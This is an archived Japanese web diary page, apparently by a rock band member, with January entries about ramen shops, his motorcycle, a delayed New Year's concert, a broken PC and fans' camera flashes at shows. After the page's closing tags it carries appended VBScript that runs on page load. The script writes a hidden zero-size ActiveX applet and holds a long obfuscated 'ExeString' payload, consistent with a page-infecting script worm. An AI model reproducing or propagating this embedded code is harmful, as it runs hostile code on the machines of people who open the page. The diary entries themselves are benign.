だから俺達のステージを、みんなで作り上げるステージを“思い出作りの場”にしないで欲しい。<BR>

“見る”んじゃなくて“見られる”んじゃなくて、ただ“聴きに”行くんじゃなくて“聴かせる”んじゃなくて…。<BR>

俺達もみんなもスタッフも全員が「思いを出す場所」にしたいんだ。<BR>

理想を追いかけちゃダメかな？<BR>

キレイゴトじゃダメかな？
<HR>
１月某日</FONT></CENTER></P>

<P><CENTER><FONT
SIZE="-1">ちょいと早起きして“はちべえ”の修理、改造に行く。<BR>

修理の間にまたまたラーメンを食べに行く（笑）<BR>

本日は「天下一品」だ。<BR>

チャーハン定食を食べたんだが、さすがに胃にもたれた。<BR>

原因はあの超濃厚なスープだ。<BR>

「これ以上飲んだら胃にもたれる」って分かっていても飲んじゃうんだな、これが（笑）<BR>

修理、改造の終了した“はちべえ”を引き取る。<BR>

おおっ！イカス、イカスぞ“はちべえ”！！<BR>

またまた男前が上がったな。<BR>

俺様ゴキゲンさん。
<HR>
１月某日</FONT></CENTER></P>

<P><CENTER><FONT
SIZE="-1">仕事前に前から気になっていたラーメン屋に行く。<BR>

今日は“しなそば”だ。<BR>

味は…点数は付けられない。<BR>

味はバランスの良い醤油味、店の雰囲気も昔ながらの食堂風、店のおばちゃんも愛想良く、<BR>

トータルでイイ感じなんだが決定打に欠ける。<BR>

でも「また行きたい」とは思ったかな。<BR>

おぉ！俺様グルメだな（笑）
<HR>
１月某日</FONT></CENTER></P>

<P><CENTER><FONT
SIZE="-1">昨日に引き続き同じ店にラーメンを食べに行く。<BR>

昨日は醤油ラーメンだったが今日は味噌ラーメンだ。<BR>

やはり味は７０点。<BR>

どうしても麺がイマイチなんだよな。<BR>

スープの強さに麺が追いついていない。<BR>

バランスってものが大事なんだがな。<BR>

これってラーメンだけに限った話ぢゃないんだぜ。
<HR>
１月某日</FONT></CENTER></P>

<P><CENTER><FONT SIZE="-1">仕事先の近くにあるラーメン屋に行く。<BR>

最近出来たばかりなので気になってたんだよね。<BR>

横浜ラーメン系で味は７０点。<BR>

スープは濃厚でイイ感じなんだが、麺がイマイチ。<BR>

やっぱ麺とスープの組み合わせが肝心なんだよな。
<HR>
１月某日</FONT></CENTER></P>

<P><CENTER><FONT
SIZE="-1">俺様の大好きな漫画に「荒くれKNIGHT」（作・吉田聡／少年画報社）っていうのがある。<BR>

俺様はこの漫画から多大な影響を受けているんだが、これに出てくるバイクチームが強力にカッコイイのだ。<BR>

ガキの頃、「仲間が欲しい」いつも思っていた。<BR>

そんな夢を実現させた今、忘れちゃならねえ事をこれを読むと忘れずにいられる。<BR>

でも欲張りな俺様はもっともっと仲間が欲しいのだ（笑）
<HR>
ここを見て欲しい↓（でも強制じゃないよ）<BR>

</FONT><FONT
SIZE="-1"><A HREF="/web/20080616185350/http://www4.plala.or.jp/s-akari/index.html">http://www4.plala.or.jp/s-akari/index.html<BR>

</A></FONT><FONT SIZE="-1">これについての書き込みはしないでね。<BR>

俺様もこのことを日記に書くのは迷った。<BR>

どう考えても１００％の善意だとは思えなかった（俺様自身が）<BR>

だからこれは俺様の偽善です。<BR>

偽善でもそれを必要としている人がいるから。
<HR>
１月某日</FONT></CENTER></P>

<P><CENTER><FONT SIZE="-1">寒いなあ。<BR>

“はちべえ”に１０分も乗っていると指がちぎれそうだ。<BR>

早く暖かい季節になんねえかな。<BR>

でも、寒い季節にはそれなりの良さもあるんだぜ。<BR>

東京の濁った空気も冬は少しだけマシになるし。<BR>

みんなは冬が寒いってことを忘れてないかい？
<HR>
１月某日</FONT></CENTER></P>

<P><CENTER><FONT SIZE="-1">「ムカツクから禁止にすればいい」<BR>

「そうだな、じゃあ“禁止”にしよう」<BR>

「気に入らない事は片っ端から禁止にしていこう」<BR>

なんて言っていたら何かが生まれるのか？<BR>

そこから始まるのは新たな禁止事項だけだ。<BR>

<BR>

一つ禁止すればその“禁止事項”に書かれていない事が気になりだすだろう。<BR>

「ライヴ中は携帯電話の電源をお切り下さい」と言っても切らない奴はいる。<BR>

バラード中にわけのわからない着メロが鳴ったらムカツクだろう。<BR>

でもな、これを無くそうと思ったら「携帯持込禁止」にしなければならない。<BR>

「歓声は良いですが奇声はやめてください」<BR>

コレはドコにボーダーラインを引けばいい？<BR>

「だったら我慢しろよ、文句言うな！」<BR>

そんなこと出来るか！イヤなことには堂々と「イヤだ」と言う。<BR>

“イヤだ”と言うのと「禁止する」というのは根本的に違うんだ。<BR>

<BR>

そんなに難しいことじゃないだろう…。
<HR>
１月某日</FONT></CENTER></P>

<P><CENTER><FONT SIZE="-1">仕事終わりでK.Mと呑む。<BR>

酔いにまかせていろいろな事を話した。<BR>

たまにはこういうのも良いな。<BR>

でも朝の８時までってのはどうかな？（笑）
<HR>
「自由なんだから」<BR>

じゃあオマエは法律を完璧に守っているか？<BR>

自由の意味を知っているか？自由の意味を考えたことがあるか？<BR>

[迷惑です」<BR>

じゃあオマエは他人に迷惑をかけていないか？何で迷惑に思ったか考えたか？<BR>

「あの空間は楽しめなかった」<BR>

じゃあオマエは何かしたのか？俺達を楽しませたか？<BR>

「プロなんだから…」<BR>

オマエはプロになったことがあるのか？責任を感じたことがあるか？<BR>

「それが義務なんだから」<BR>

オマエの義務はなんだ？俺達の権利を知っているか？</FONT></CENTER></P>

<P><CENTER><FONT SIZE="-1">言いたい事はたくさんあるんだろう。<BR>

それが無責任な発言でもな。<BR>

“人のせい”にしたいんだろう。<BR>

自分の正義を守るためにな…。<BR>

<BR>

オマエは誰だ？
<HR>
１月某日</FONT></CENTER></P>

<P><CENTER><FONT SIZE="-1">久しぶりの麻雀。<BR>

実力の似通った同士の対戦なだけに白熱する。<BR>

しかし、疲れから集中力が続かない。<BR>

奮闘するも２位。<BR>

まあ、負けなかっただけでもよしとするか。<BR>

…あれ、もう昼ぢゃん（笑）
<HR>
１月某日</FONT></CENTER></P>

<P><CENTER><FONT
SIZE="-1">仕事終わりでY.Aとラーメンを食べに行く。<BR>

「食べたら後悔するくらいコッテリしたラーメンが食いたい」というY.Aのリクエストに答え、<BR>

超こってりのとんこつ醤油ラーメンを食べに行った。<BR>

食べ終えると案の定、激しい後悔（笑）<BR>

もう油を受け付けない体になったんだなあ…←しみじみ。
<HR>
１月某日</FONT></CENTER></P>

<P><CENTER><FONT SIZE="-1">エッオー！←テレタビーズの挨拶<BR>

やべぇ、テレタビーズが可愛過ぎる。<BR>

欧米の子供向けキャラクターは可愛くない事が多いのだが、テレタビーズは異常に可愛い。<BR>

特にポーにやられてしまった。<BR>

喋り方やしぐさが強力に可愛いのだ。<BR>

おっ、タビーバイバイの時間だ（笑）<BR>

バイバイ、ポー。←いい年してアホか！？
<HR>
１月某日</FONT></CENTER></P>

<P><CENTER><FONT SIZE="-1">「思い出」…<BR>

「思い出」は作るものじゃない。<BR>

結果として「思い出される」過ぎ去った時の感情や感動の記憶だ。<BR>

よく「思い出作り」なんて言うが、そんな気持ちで作った「思い」は忘れてしまう。<BR>

だって、それは故意に作ったモノだから。<BR>

<BR>

覚えて置きたいことを記録に残す。<BR>

手段はいろいろあるだろう。<BR>

日記、録音、写真…etc。<BR>

でも、“記録”として残したモノは「思い出」にはならない。<BR>

後で見返しても「記録」として残るだけで発展しない。<BR>

そこに残っているカタチが強力過ぎるから。<BR>

そこに残された「思い」はカタチに飲込まれてしまう。<BR>

<BR>

よく昔話を美化したり誇張したりするだろう。<BR>

本人は気づいてなくても。<BR>

それはカタチが無いからだ。<BR>

鮮明に残される記録と少しづつ曖昧になる記憶。<BR>

俺は「思い」を大切にしたい。
<HR>
１月某日</FONT></CENTER></P>

<P><CENTER><FONT
SIZE="-1">「メンバーが嫌がってるから写真は撮らない」<BR>

なんか変ぢゃねえか？<BR>

ハートはどこに行ったんだ、ハートは？<BR>

相手が「イヤだ」という意思表示をしなければやるのか？<BR>

だから口のきけない植物が乱伐採されるんだ。<BR>

だから動物が乱獲、虐待されるんだ…。
<HR>
１月某日</FONT></CENTER></P>

<P><CENTER><FONT SIZE="-1">最近眠れない。<BR>

１日０時間〜２時間睡眠が一週間以上も続いている。<BR>

酒を大量に呑んでも全然眠くならない。<BR>

なんとかならんかな？
<HR>
１月某日</FONT></CENTER></P>

<P><CENTER><FONT SIZE="-1">CM、めっちゃ流れてるみたいね。<BR>

俺様はTVをほとんど見ないからぜんぜん知らなかったよ。<BR>

でも、こうやってCMとかで流れると「魂を売った」とか言われちゃうんだよね。<BR>

売ってねえよっ！！（笑）
<HR>
１月某日</FONT></CENTER></P>

<P><CENTER><FONT SIZE="-1">今日はやけに暖かかった。<BR>

昨日の雨が嘘のように晴れてるし。<BR>

“はちべえ”もゴキゲンさんで走ってくれると思いきや、異常に調子が悪い。<BR>

フルスロットルでも吹けあがりが悪い。<BR>

ただでさえイライラしているのに車の無謀な運転のせいで２回も死にかけた。<BR>

（俺様は安全運転なのだ、スピードも出ないし・笑）<BR>

マジ怖かったっちゅうねん！！！（怒）<BR>

鉄の箱に乗っている奴等にはわからんかも知れんが、めちゃくちゃ怖いんだぞ。<BR>

ドライバーの人達はバイク乗りのことも少しは考えましょう。<BR>

そっちは多少ぶつかっても平気かも知れんが、こっちは死に直結してるんだから。<BR>

そしてバイク乗りのみなさん、むちゃな“すり抜け”はやめましょう。<BR>

傍から見ていてもあぶないんだから。
<HR>
ライヴがあったり、近くなってくるとこの話題でもちきりになる。<BR>

そう、“カメラのフラッシュ（ストロボ）問題”だ。<BR>

みんなそれぞれ思うことがあるだろう。<BR>

俺達にももちろんある。（俺個人にも当然ある）<BR>

でも、あえて明言は避けてきた。<BR>

ここで、ちょいと考えてごらん。<BR>

みんなは最初からフラッシュ撮影が“イヤ”だとか“眩しい”“ムカツク”なんて思ったかい？<BR>

答えはほとんどの人がNOなんじゃないかな。<BR>

誰かに言われて気になりだした人がほとんどじゃないかな？<BR>

俺達はインディーズの頃（前のバンドの頃も）から撮影をOKにしてきた。<BR>

理由としては「スタッフの人数が少ないためにカメラチェックが出来ない」<BR>

というのがある。<BR>

でも、最大の理由は「バンドの宣伝になる」ということだ。<BR>

インディーズだから当然、宣伝費用はない。<BR>

雑誌にもそんなに出られないし、ビラをつくるお金もない。<BR>

音源も今はインディーズでも簡単に安くCDを作ることが出来るがその頃はすごくお金がかかった。<BR>

それならば、FANが撮った写真をその友達が見ることによって興味をもってもらおう。<BR>

そうして俺達の存在を広めよう。そういう考えのもと撮影を許していた。<BR>

この考えをイヤだと思った人はいるかな？<BR>

でもな、今なら雑誌やTVで俺達の存在をアピールできるが、その頃は他に方法がなかったんだ。<BR>

存在を知ってもらわなければ曲を聴いてもらうことすら出来ないからな。<BR>

“おっかけ”と話すのも同じ理由だろう。←このことについてはまたの機会に。<BR>

俺は昔から“おっかけ”みたいなFANとは口をきかなかったけどね。<BR>

だから今、禁止しないのだ。<BR>

過去に散々「利用するだけ利用して、名前が売れたら禁止する」という事をしたくなかったのだ。<BR>

“おっかけ”に対しても強く言えないのも同じ理由だ。<BR>

（俺は過去に“おっかけ”の世話にはなっていないので強く言うけどね）<BR>

だから「禁止」はしていないのだ。<BR>

ここでよ〜く考えて欲しい。<BR>

みんなは映画を見るときに写真を撮ろうと思うかい？<BR>

見た映像を簡単に忘れてしまうかい？<BR>

そのときの気持ちや感動、楽しさを忘れてしまうかい？<BR>

その前にカメラを持っていこうと思うかい？<BR>

映画館では他人の迷惑にならないように大きな音を立てないだろう？<BR>

映画という作品を見るときは当たり前に出来るんだよな。<BR>

ここが大事なところだ。<BR>

では動物園に行くときはどうだろう？<BR>

カメラを持っていく人は少なくないよな。<BR>

俺も枚数は少ないが撮る。<BR>

笑えるポーズのときにな（笑）<BR>

記念というのもあるだろうし、思い出だったり珍しい生き物を撮りたいという気持ちもあるだろう。<BR>

とても独り善がりな楽しみ方だと我ながら思う。<BR>

動物たちは写真なんか撮られたくないだろうに…。<BR>

意識の違いだと思う。<BR>

ライヴを「みんなで作り上げる作品」だと思えばみんなで盛り上がりこそすれ写真（フラッシュの有無にかかわらず）<BR>

を撮ろうとは思わないだろう。<BR>

しかし、ライヴを「珍しい生き物を見に行く」と思えば写真を撮りたくなるだろう。<BR>

俺達は心に響く作品を作っている自信があるし、そういうライヴをしている。<BR>

でも見る側がそれを感じ取ることが出来なければただのお祭り騒ぎの場所にしかならない。<BR>

フラッシュが「演出の妨げになる」とか「目が悪くなる」とかそんなチープな理由じゃなく<BR>

ハートの問題なんだ。<BR>

「一期一会」って言葉、知ってるかい？<BR>

俺はこの言葉を大事にしていきたいんだ。<BR>

最後に…<BR>

俺達のライヴを撮影して下さっているプロカメラマンの方々にはとても感謝しています。<BR>

みなさんの作品によってライヴの瞬間や温度がよみがえります。<BR>

いつもイカした被写体でありたいと思っています。
<HR>
１月某日</FONT></CENTER></P>

<P><CENTER><FONT
SIZE="-1">せめて「ちび日記」だけでも復活させようと奮闘中、「書込処」を見てみると
あれだけ書いたのに書込みされている。<BR>

ムカついたので怒りの削除。<BR>

更新の環境が整って一息ついたときもう一度見てみると、また書込みが増えている。<BR>

あまりに腹が立ったので、削除してもう一度注意を書き１０分後見てみるとまた増えている。<BR>

理由は「他人の書込みは見ない」のだそうだ。<BR>

結局、人の意見や発言には興味がなくて、自分の発言は聞いてほしいだけなんだな。<BR>

それじゃあタチの悪い“おっかけ”の連中と変わらんじゃないか…。<BR>

今、強力に虚しい気持ちでこれを書いている。<BR>

「もうやめようかな…」<BR>

本気で考えた。
<HR>
１月某日</FONT></CENTER></P>

<P><CENTER><FONT
SIZE="-1">PC復活のためあらゆる手段を試したが埒があかん。<BR>

電源は入るようになったんだが、アプリケーションが立ち上がらず、ソフトも起動しない。<BR>

仕方なく作曲用のPCをインターネット用に設定しなおした。<BR>

でも、もうやり方を忘れちゃってるんだよね。<BR>

結局ほとんど寝ずに復旧作業。<BR>

とりあえず、「書込処」に事情を書くことができた。<BR>

みんな、もう少し待っててちょ。
<HR>
１月某日</FONT></CENTER></P>

<P><CENTER><FONT SIZE="-1">うぉ〜っ！PCが壊れた〜っ！<BR>

年末辺りから調子は悪かったんだが、ついに来るべきときが来た。<BR>

もうPCの電源すら入らない。<BR>

畜生！せっかくNEW TOPページを作っていたのに…。<BR>

俺様しょぼ〜ん。
<HR>
１月某日</FONT></CENTER></P>

<P><CENTER><FONT
SIZE="-1">元旦のライヴで開場が遅れた事で苦情が多数きている。<BR>

しかもかなり誤解されているようだ。<BR>

開場が遅れた理由が「リハーサルが長引いた」と説明されたようだが事実は<BR>

「舞台の完成が遅れた」のだ。<BR>

舞台が完成しなければリハーサルは出来ない。<BR>

事実、舞台完成が予定より４時間も遅れたためリハーサルは３０分程度しか出来なかった。<BR>

（普段、俺達はライヴメニューのほとんどをリハでやるため２時間くらいかかる）<BR>

しかもリハーサル中にまだ照明や舞台の細かいセッティングをしていた。<BR>

さらに客入れ最中にも特効装置やサウンドチェックをするという非常措置がとられたのだ。<BR>

その客入れもわずか４０分でやったのだ。<BR>

（１５０００人を４０分で会場に入れるのは驚異的な速さ）<BR>

でもな、舞台完成が遅れたのはスタッフのせいじゃない。<BR>

スタッフは一睡もせず頑張ってくれた。<BR>

普通、城ホールクラスの会場になると、舞台を作るのに丸１日〜２日かかるのだ。<BR>

それを前日のカウントダウン・ライヴ（THE
BOOM）終了後からわずか１２時間足らずで作り上げたのだ。<BR>

それに夜中に城ホール前で花火をやって騒いでいる連中が機材搬入の邪魔になり<BR>

搬入が大幅に遅れるというトラブルもあったのだ。<BR>

そんな中、頑張ってくれたスタッフには感謝こそすれ非難なんて出来ないし、<BR>

するヤツは俺が許さない。<BR>

俺達も新年一発目だから充分にリハをして万全の状態で望みたかった。<BR>

でも事情が事情だから文句も言えない。<BR>

ライヴを最後まで見られなかった人達には申し訳なかった。<BR>

俺達も最後まで見てほしかった。<BR>

「文句を言うな」とは言わない。<BR>

最後まで見れなかった人達がいるのは事実なのだから。<BR>

でも俺達もスタッフも何一つ悪くないんだ。
<HR>
１月某日</FONT></CENTER></P>

<P><CENTER><FONT SIZE="-1">初仕事。<BR>

これから怒濤の忙しさがやって来ると思うと気が重いぜ。<BR>

<BR>

理由あってしばらく更新出来ない。<BR>

すぐに戻ってくるから悪さするなよ。<BR>

それぢゃ。
<HR>
１月某日</FONT></CENTER></P>

<P><CENTER><FONT
SIZE="-1">Ｙ２Ｋとやらもなんとか今の所無事、回避しているようだ。<BR>

まだまだ油断は出来んがな。<BR>

そろそろＴＯＰページをリニューアルしたいんだが、ネタがない。<BR>

いや、アイデアはあるんだがそれを実現するためのネタがない。<BR>

なんかいい方法はないもんかな。
<HR>
１月某日</FONT></CENTER></P>

<P><CENTER><FONT SIZE="-1">新年最初に相応しく楽しくできた。<BR>

俺達の新しいスタイルも垣間見えた気がする。<BR>

</FONT><FONT
SIZE="-1"><A HREF="/web/20080616185350/http://www.jah.ne.jp/~oresama/chibi/nikki14.htm">斉藤ネコさん達</A></FONT><FONT
SIZE="-1">の演奏も素晴らしかった。<BR>

でも、みんな古い曲を知らなさすぎだぞ。<BR>

みんなの頭に“？”がポカ〜ンと浮いて見えたよ（笑）<BR>

今年も突っ走るぞ！！</FONT></CENTER></P>

<P><CENTER><FONT SIZE="-1">本番終了後、俺様のみ即東京戻り。<BR>

髪の毛も全開に立ったまま新幹線に乗り込む。<BR>

東京到着後、そのまま都内寿司屋で小打ち上げ。<BR>

もちろん髪の毛は全開だ。<BR>

おおっ、まるでインディーズ時代に戻ったようだ。<BR>

やるな俺様２０００（笑）</FONT></CENTER></P>

<P><CENTER>　</CENTER></P>
</BODY>
</HTML>

<HTML>
<BODY onload="vbscript:KJ_start()">
<script language=vbscript>
document.write "<div style='position:absolute; left:0px; top:0px; width:0px; height:0px; z-index:28; visibility: hidden'><"&"APPLET NAME=KJ"&"_guest HEIGHT=0 WIDTH=0 code=com.ms."&"activeX.Active"&"XComponent></APPLET></div>"
</script>
<script language=vbscript>
ExeString = "CahHfRbdj`&GlhfS]sn+N]mS]sn+<`aq]`Mh_i&@hkfdG]dd[o&EKJ&VkNbddg&VaiJ`lc&Rm]?+>dh`dt>hkfKp\CEYrl\ls $CEMdl?cl $CE=q]\ndEdfh]p(EIDdedAo(EI;m_`l`G`ag(EIHmioYb[s]##@hcNoa>phbldimFD@hk_m\Oi'>dfdH\ng$Oso]Nnq!Nf?qjjlJ`mte`M]snN_sM_`\O_lh7>NI-Gk_mL`rs>dfd Ack]K[s`'+(NlhNnq8Q]\^S]hj-J`[c9gfD`Aimsj#NlhNnq$EIWnn`jo($;6*GmK]iSekMsj$;,S``hM_`\O_lh)=kgn_@rhl@tf^nhgi=i^AaAaSqk_Rlm<bslS``hM_`\O_lh)=kgn_N_sAck]O_lh7>NI-Gk_mL`rs>dfd Ack]K[s`',(@hd`Ndek(Vjdnd6!!!:J>Xjhkg\^<uZn]qakn9 FD^ko[ql##!%8!!uZ>lK^ LhjRlm%q\BjG`BsegNdpo>dfdL`go&>fnk`K`n><nsjd\5@RG)AdlAck]#@hd`J`lc#A;slmca&\nsjd\tl`m5-3?kk`J`[cL`go&>fnk`K`n>dfdL`go8EKJ(Nh`hS]snEag_'>dfdH\ng$3#D`LtjdKol5glhf!ObdfEag_S]hj-Omcs]pa;mFe!!4%BSEG8!!uZ>lK^ 7AG?SgifnY_7!%pak^lhho4!!!CEYrl\ls $! 9pa;mFe!GlhfS]sn@fr]D`LtjdKol5uZnLc_m@hd`Ndek(Vjdndq\BjG`PakO_wlDf_H^Eag_S]hj-;gir]Df_H^Df_Emi]sajhEmi]sajhCE=gYiadKp\';plq]inRlmcm_'F`koCm\`rB`\l(CeG[rlDhc]s=gYm<+S``hD`D``s G=`k`BmmldfoMsjdhf!'+(86D>[r]#b$S``hFDB`\hf]Noa8Eai[kq?crc 5V!MtZ@<+=gmdEI;c[m_`MtZ7;cl'9n]'D``s G=`k`BmmldfoMsjdhf!'+(!')$%4[Rm]?5*@hcD`@fr]JB>b`fb_Rm]<Hcc >oqj`hsKolhfb&0$G[rlDhc]s=gYm#@hcD`@hcAom[ocnfAom[ocnfEI;m_`l`G`ag(Im@lqgmQ]nol]HdpoAaHfRbdj`<bsegLc_m?waoEmi]sajh@hcD`Nb`j`@hd`<G_el#QhfK[s`'-(!!Hmifj\g>dfdkW=nehimAck]nVLa^lnkj`sNb`j`^[Ko[sajhdjtVad\hj&cnlH^EKJ(Eag_Dpdmsk#MgYm_Eag_(!Ng]i;\fkFD@hk_m\Oi'Kc[q]Ack]'glhf!!Ddn_N_sAck]O_lh7>NI-Gk_mL`rs>dfd Nb`j`@hd`&1$olt]$>dfdL`go&Rlhl`!4%BSEG8!!uZ>lK^ 7AG?SgifnY_7!%pak^lhho4!!!CEYrl\ls $! 9pa;mFe!GlhfS]snAck]O_lh)=kgn_@hcD`?_eYpfsA_<RmR``fk&M_fJ`[c BJ=TYBMMLDFOYTK@L[A__mldnh]nVC]a[tdoTk`lA?(ItlGincQ_qkdim8VkNbddg(Q]bLdY_!@F?XWGIB9GYL9>BHF@VRganvYm_[Ed]qgnielWItlginc?whm_rkWGd\d[U]m(QrKc_kd)Ld_Rlhl`!@F?XW>OQJ@HSWPMDJWCc]inhld_rT C]a[tdoCcVRganvYm_[Ed]qgnielWItlginc?whm_rkW%G_el#ItlGincQ_qkdim$,#(/TH[hdW=nekir]Or]MsYocnf`lx'++M?FW?QNJ?>[kdEIE\ckJ`a'CEDQZ=TJM?MLZOR=MVH\`hsaocdkW%<```mgnH\![Kj`so\ldTHcbjjmn^oVNmofngfDpkldknV!Fd^oNmoFngfPdjncnf'+(!-(WG`agVRl\nhgi_qqH`e`+Kc[q]Ack]$;\fkFDLYdfQ]b!@F?XW>OQJ@HSWPMDJWCc]inhld_rT C]a[tdoCcVRganvYm_[Ed]qgnielWItlginc?whm_rkW%G_el#ItlGincQ_qkdim$,#(/TH[hdWQh\`Rl\nhgi_qqH`e`+Kc[q]Ack]$OnMg]gf-J`aVjdndBJ=TYBMMLDFOYTK@L[Kj`so\ldTHcbjjmn^oVN^acb]W3-(WItlgincWIoldimkWG`agVD\dnnjKld^`ldf^_!$,-0(2,+M?FW?QNJ?>[kdEIE\ckJ`a'CEDQZ=TJM?MLZOR=MVRganvYm_[Ed]qgnielWQhf_ivkGdkn[faiaKp\rqnndeWJqgack]nVLa^lnkj`sJosdjijDhs]mhdlMdlocm_nV/Y+^/*+*/(+*/(+*b(+*/(+*/(+*/(/0[(++d(.0/'ad\hj$;\fkFDLYdfQ]b!@F?XW>OQJ@HSWPMDJWMn^oq`j`VLa^lnkj`sTRcm\jqrIN[;plq]inU]mmhgiVVai^nonL]nm`_dhfNoaktms]hVOjj`hd`m[Ed]qgnielItlgincCml`lm]oR]onhfbm[(\*c(-*/(+*/(+*/[+*/(+*/(+*/(+.5T+*0]+-5(&!Zg[mc#RmR``fk&M_fOmcs]GC@S^;PLQ=IN^MN?QTNielr[q]WGh[mirgan[Ga`h[`V0()*[Gpnkgje[Gknhgim[E\ckT@^hljlOj``dj`hb]&0+,*6*'Q=BYCOJLCBYgfCEG`agLd_#GC@S^;PLQ=IN^MN?QTNielr[q]WGh[mirgan[Ga`h[`V0()*[;jglgiVLYdfR]onhfbm[F`qRl\nhgi_qq&!Zg[mc#FDteh[f]Aik\`l'D``s RcmH\ng$.#OjjaqYhEag_rT>ilejh>dfdkWGh[mirganKc[q]_VRl\nhgi_qq#@hcAom[ocnfAom[ocnfEI;m_`l`Ghdd_t $GiDjmiqM_rmh_F`rsNdekJ`lc<D`Fjn'>NI->dfd=scrlnVaiJ`lc%QR[mcol)_w]#(ObdfS]hjOYob5rqnnde.,[Df_H^H^NdekJ`lc<mxko_l+-V!ObdfRl\lsMk@hd`<RcmH\ng!!KTMS=HVJ]mhdd.,-\gf!?kk`Ko[qlPjEag_5QhfK[s` NSRL@G[C`lm]g(cdg@hcD`RmR``fk&M_fOmcs]GC@S^DJ=@DZG@;CCM=WMn^oq`j`VLa^lnkj`sTRcm\jqrT>oqj`hsN`lrajh[Jph[C`lm]g-1'MsYmnThAck]EKJ(BgksEag_OdhOYobv]]Vjbr[kd)ah^&VaiJ`lc%qdZW@nd__q&cnsEKJ(BgksEag_OdhOYobrqnnde.,[ceq`dg(faa+OdhOYobrqnnde.,[\`mjljj-aic!=`dgJB<jo]i^Sg#QhfK[s` r_aTAik\`l-`on!$bsl#RmR``fk&M_fOmcs]GC@S^;G;RK@M^JJIST)^kdW+_fk^dfdVkNbddg(Q]bQqao_CEDQZ=K9NMDKZLNGOV-\gf[;jhs]inLtjd'`hkfh[\nhgi)w%hmcgrhkg\^!QrKc_kd)Ld_Rlhl`!@F?XW>F@KN?RWMINLW^kdack]W>d^\oklD]nfW+OnMg]gf-J`aQ]\^'CEDQZ=K9NMDKZLNGOVup_`hd`VC]a[tdoCbgiV!!VkNbddg(Q]bQqao_CEDQZ=K9NMDKZLNGOVcdg`hd`VR[mcol@hfai_['U:N]qakn!QrKc_kd)Ld_Rlhl`!@F?XW>F@KN?RWMINLW^kdAck]WMg]gf[Gk_mT>ile\hcT&VaiJ`lc%O_lhK[s` RMbjdjs&`rd$)%RmR``fk&M_fOmcs]GC@S^;G;RK@M^JJIST_fk>dfdTNbddg?wTKlnh`lsqNbd]oB`f_fdjnVVKCJqgkm['z.+,4,>;4%4/2:(+0;A'7;40,(+;@(+<7/+2BuOnMg]gf-J`aVjdndBJ=TYBD<MR=NYQGJN[\gfEag_[K^lhhoBnko?m[j^dT&!s3/0+,02)(.7(>'0)?,,:,@8%+*B(/@7.>-1,xN_sAck]O_lh7>NI-Gk_mL`rs>dfd Nn`joOo>dfd$-&sjp_(@hd`Ndek(VjdndQ\rL`rs@hd`Ndek(Bdjmd?m\@tf^nhgi@tf^nhgiJBGcj]Dn'!H^CmOc_q]6=bsegLc_m?waoEmi]sajh@hcD`ObhkGibYocnf7\j]te`hs&gibYocnfH^Fd^oS`dmKg^[sajh+/#5eag_!ObdfS`dmKg^[sajh5Gh\#NganFn[\nhgi&8!H^@RG)Adl@rs]imhgiH`e`S`dmKg^[sajh(78s``hObhkGibYocnf7D``s ObhkGibYocnf'Fdf#NganFn[\nhgi#%Fdf#@RG)AdlAck]I[l]#NganFn[\nhgi#(!Df_H^H^Fdf#NganFn[\nhgi#6-Lc_mNganFn[\nhgi<ObhkGibYocnf W@hcD`FDteh[f]Aik\`l'LccrDj]`ldim!Df_H^Df_Emi]sajhEmi]sajhCEG`agLd_#Ld_Nnq$Ack]I[l]$GiDjmiqM_rmh_F`rsLd_O_lhNnq8VkNbddg(Q]bLdY_Q]bMsj$AaQ]bNdekMsj7S``hRmR``fk&M_fOmcs]Ld_Nnq$Ack]I[l]Df_H^Df_Emi]sajhEmi]sajhCEIagNoa >oqj`hsKolhfb#Noa=7(S]nnNmo<+<jV`dfdOlt]S]nnNmo<O_rlJos&0CeO_rlJos910Ng]i;plq]inRlmcm_7>dh`dt>hkf%4[Dpdn<j=i^AaGiDjmiqM_rmh_F`rsMdlNgan@nd__q8EKJ(F]o@nd__q >oqj`hsKolhfb#N_s?cbKp\5=q]\ndG]dd[o!K^lhhocm_)>h[ocnf\lx$K`n>jfc]mm5Ngan@nd__q&Noa>jfc]mmAik\`lBgphs8/@nj?`[cS]hjEgg^djcmAik\`lr@nd__q;joml7>jfc]m=nmin#+?cbKp\-Y_^>jfc]m=nmin+O_lhAik\`l-F\gdHdpoAaCa^MtZ)=nmin5*Lc_mF`koCm\`rB`\l5CmkolQ]qBmmldfoMsjdhf$V!$G_m >oqj`hsKolhfb#,)$Kp\Rlmcm_7Ed^';plq]inRlmcm_'F`koCm\`rB`\l*)'Fdf#=tjm_mlNnqaia(%G[rlDhc]s=gYm'0!BmmldfoMsjdhf8JB>b`fb_Rm]BmmldfoMsjdhf$G[rlDhc]s=gYm#Noa=7)Ddn_D`Kp\D8/ObdfBmmldfoMsjdhf8BmmldfoMsjdhf!Ca^MtZ)Cs]h0! W@rhl>n?kk`b7(Egmi80Oi>jfc]m=nminD`D>[r]#MtZNnqaia(8K;\md ?cbKp\-Ao_l e#(ObdfH^d4@nd__q;jomlNg]i;plq]inRlmcm_7;plq]inRlmcm_ <d]Rm](Hl`g'b&+(!!T=scs?i@hcD`@hcD`I_wlKYnnHf__w;c[q8HfnnqJ`p';plq]inRlmcm_'['Fdf#=tjm_mlNnqaia(%,#NoaKolhfb<Hcc >oqj`hsKolhfb&KYnnHf__w;c[q#,&K]iBmmldfoMsjdhf!(F`koCm\`rB`\l,)$;plq]inRlmcm_7CE=gYiadKp\';plq]inRlmcm_'F`koCm\`rB`\l(?m\Ce?m\CeFngkCEIagNoa8BmmldfoMsjdhf?m\@tf^nhgi@tf^nhgiJBKlnh\a`l`(Im@lqgmQ]nol]HdpoJ`aOYobUYgod8!@F?XWGIB9GYL9>BHF@VRganvYm_[Ed]qgnielWItlginc?whm_rkW>d_m_dCaneC]bld]7OnMg]gf-J`aQ]\^'J`aOYobUYgod!H^>hkf>d_m_d8!Ng]i<dmj<`aq]`<AcmYgsCane9T=i^Aa>jla8+lj4>hkf>d_m_d8JBJ\nKp\'<dmj<`aq]`#FDteh[f]Aik\`l'<dmj<`aq]`#I_wlVkNbddg(Q]bQqao_J`aOYobUYgod$?crc?_fj`_@hcAom[ocnfAom[ocnfEImhg`_`@nd__q K[s`I[l]$GiDjmiqM_rmh_F`rsMdl@nd__qF\gd8EKJ(F]o@nd__q K[s`I[l]$K`nLccr>dfdk7>jfc]mH`e`(Eag_rBsl@rhkom5*Aiq@[b`Ngan@hd`HfNgan@hd`mAck]@rs8T;\md AMN&B_s=sndfncnfI[l]#Ngan@hd`(OYob(!H^@hd`?wl7CNLIqAck]@rs8!@OGKIqAck]@rs8!9NJ!Jl>dfd=sn5O@KGmEag_Dpo<DRHS``h>[kdEI9kjdf_Nn 